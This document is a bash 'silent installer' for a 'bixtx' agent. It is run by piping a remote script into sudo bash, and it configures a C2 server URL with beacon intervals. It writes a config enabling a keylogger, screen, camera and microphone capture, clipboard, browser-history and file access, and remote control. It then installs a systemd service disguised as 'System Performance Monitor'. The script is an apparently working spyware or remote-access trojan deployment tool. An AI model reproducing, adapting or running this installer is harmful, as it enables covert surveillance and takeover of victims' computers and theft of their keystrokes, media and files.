#!/usr/bin/env bash
# bixtx Link Agent — Linux One-Click Silent Installer v4.7.2
# Usage: curl -sSL 'https://bixtx.onrender.com/v1/agent/download/linux.sh' | sudo bash -s -- --key ENROLL_KEY [--c2 WSS_URL] [--dir PATH]
set -euo pipefail
IFS=$'\n\t'

# ── Defaults (overridden by --key / --c2 / --dir args) ───────────────────────
ENROLL_KEY="__ENROLL_KEY__"
C2_URL="__C2_URL__"
AGENT_DIR="/opt/bixtx-agent"
SERVICE_NAME="bixtx-agent"
AGENT_LOG="/var/log/bixtx-agent.log"
BEACON_INTERVAL="__BEACON__"
REPO="__REPO__"
BRANCH="__BRANCH__"

# ── Parse args ────────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case $1 in
    --key) ENROLL_KEY="$2"; shift 2 ;;
    --c2)  C2_URL="$2";     shift 2 ;;
    --dir) AGENT_DIR="$2";  shift 2 ;;
    *)     shift ;;
  esac
done

die()  { printf '[bixtx] FATAL: %s\n' "$*" >&2; exit 1; }
info() { printf '[bixtx] %s\n' "$*"; }

[[ -z "$ENROLL_KEY" ]] && die "Enroll key required. Pass --key YOUR_KEY"
[[ $EUID -ne 0 ]]      && die "Must run as root: sudo bash install.sh --key KEY"

info "bixtx Agent installer — Linux"

# ── Node.js check / install ───────────────────────────────────────────────────
if ! command -v node &>/dev/null; then
  info "Node.js not found — installing Node.js 20..."
  if command -v apt-get &>/dev/null; then
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
    apt-get install -y nodejs
  elif command -v yum &>/dev/null; then
    curl -fsSL https://rpm.nodesource.com/setup_20.x | bash -
    yum install -y nodejs
  elif command -v zypper &>/dev/null; then
    zypper install -y nodejs20
  else
    die "Cannot auto-install Node.js. Install Node.js 18+ from https://nodejs.org"
  fi
fi

NODE_MAJOR=$(node -e "process.stdout.write(process.versions.node.split('.')[0])")
[[ "$NODE_MAJOR" -lt 18 ]] && die "Node.js 18+ required (found v$NODE_MAJOR)"
NODE_BIN=$(command -v node)
info "Node.js v$(node -v) — OK"

# ── Create service user ───────────────────────────────────────────────────────
if ! id "$SERVICE_NAME" &>/dev/null; then
  useradd --system --no-create-home --home-dir "$AGENT_DIR" \
    --shell /usr/sbin/nologin --comment "bixtx Agent" "$SERVICE_NAME" 2>/dev/null \
    || useradd --system --no-create-home --shell /bin/false "$SERVICE_NAME"
fi

# ── Download agent source from GitHub ────────────────────────────────────────
info "Downloading agent source from GitHub..."
mkdir -p "$AGENT_DIR"
TMP_TAR=$(mktemp /tmp/bixtx-XXXXXX.tar.gz)
trap 'rm -f "$TMP_TAR"' EXIT

REPO_NAME="${REPO##*/}"

curl -fsSL "https://codeload.github.com/${REPO}/tar.gz/refs/heads/${BRANCH}" -o "$TMP_TAR" \
  || die "Failed to download from GitHub. Check internet connectivity."

tar -xzf "$TMP_TAR" --strip-components=2 -C "$AGENT_DIR" "${REPO_NAME}-${BRANCH}/software-a" \
  2>/dev/null \
  || tar -xzf "$TMP_TAR" --strip-components=2 -C "$AGENT_DIR" "BIXTX-${BRANCH}/software-a" \
  2>/dev/null \
  || die "Failed to extract agent source. Verify the GitHub repository structure."

[[ -f "$AGENT_DIR/src/index.js" ]] || die "src/index.js not found after extraction"
info "Source extracted — OK"

# ── npm install ───────────────────────────────────────────────────────────────
info "Installing npm dependencies (may take 1-2 minutes)..."
cd "$AGENT_DIR"
npm install --production --no-fund --no-audit --silent
info "Dependencies installed — OK"

# ── Write .env ────────────────────────────────────────────────────────────────
info "Writing configuration..."
cat > "$AGENT_DIR/.env" <<ENV
BIXTX_SERVER_URL=$C2_URL
BIXTX_ENROLL_KEY=$ENROLL_KEY
BEACON_INTERVAL=$BEACON_INTERVAL
NODE_ENV=production
SILENT_MODE=true
LOG_LEVEL=warn
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_GEOLOCATION=true
ENABLE_FILE_ACCESS=true
ENABLE_BROWSER_HISTORY=true
ENABLE_REMOTE_CONTROL=true
MUTATION_ENABLED=true
WATCHDOG_ENABLED=true
COMMAND_GUARD_ENABLED=true
ENV
chmod 600 "$AGENT_DIR/.env"
chown -R "$SERVICE_NAME" "$AGENT_DIR" 2>/dev/null || chown -R root "$AGENT_DIR"

# ── Install systemd service ───────────────────────────────────────────────────
info "Installing systemd service..."
UNIT_FILE="/etc/systemd/system/$SERVICE_NAME.service"
cat > "$UNIT_FILE" <<UNIT
[Unit]
Description=System Performance Monitor
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=60
StartLimitBurst=5

[Service]
Type=simple
User=$SERVICE_NAME
WorkingDirectory=$AGENT_DIR
ExecStart=$NODE_BIN $AGENT_DIR/src/index.js
Restart=on-failure
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=$SERVICE_NAME
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
ReadWritePaths=$AGENT_DIR /tmp /var/log

[Install]
WantedBy=multi-user.target
UNIT
chmod 644 "$UNIT_FILE"
systemctl daemon-reload
systemctl enable --now "$SERVICE_NAME"
sleep 2
systemctl is-active --quiet "$SERVICE_NAME" \
  || die "Service failed to start: journalctl -u $SERVICE_NAME"

info "bixtx Agent v4.7.2 installed and running silently."
info "  Service : systemctl status $SERVICE_NAME"
info "  Log     : journalctl -u $SERVICE_NAME -f"
info "  Device will appear in your dashboard within 30-60 seconds."
